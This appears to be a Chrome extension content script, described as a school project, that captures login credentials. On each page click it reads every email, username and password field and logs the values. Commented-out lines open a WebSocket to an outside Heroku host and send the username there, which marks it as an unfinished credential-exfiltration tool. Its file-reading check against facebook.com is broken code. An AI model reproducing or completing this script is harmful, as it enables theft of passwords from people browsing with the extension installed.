//Just in case a popular website is trying to redflag my IP
console.log("This is all for a school project!");

//var HOST = 'wss://thawing-island-58409.herokuapp.com';
//var ws = new WebSocket(HOST);


//This will get all the values of type email
//Email is the standard type for the email text box
//in most browsers

//Simply say the website of the current tab
console.log(window.location.host);

//Just for testing purposes
chrome.storage.sync.get("id", function(ev){
  console.log("This user is id is " + ev.id)
});

//Wait for a click on the screen
window.addEventListener("click", clickListen, false);

function clickListen (e){
  var val = document.getElementsByTagName('input');
  for(var i = 0; i < val.length; i++){
    if(val[i].type.toLowerCase() == 'email'){
        if(!(val[i].value === "" || val[i].value === null)){
          console.log("Username is " + val[i].value);
      }
    }
    if(val[i].type.toLowerCase() == 'password'){
      if(!(val[i].value === "" || val[i].value === null)){
        console.log("Password is " + val[i].value);
      }
    }
    /*
    Some forms that are used, such as instagram forms,
    have a input name rather than a type.
    */
    if(val[i].name.toLowerCase() == 'username'){
      if(!(val[i].value === "" || val[i].value === null)){
        console.log("Username is " + val[i].value);
      }
    }
  }
}


var test = "www.facebook.com";
var urlT = window.location.host;
var txt = "list.txt";

function readFile(file){
  var reader = new FileReader();
  reader.onload = function(evt){
    var txt = evt.target.result;
    if(txt.localeCompare(test) === 0){
      console.log("EUREKA");
    }
    else{
      console.log("FUCK");
    }
  };
  reader.readAsText(txt);
}

readFile(txt);





//ws.send("Username is "+document.getElementById('username').value);
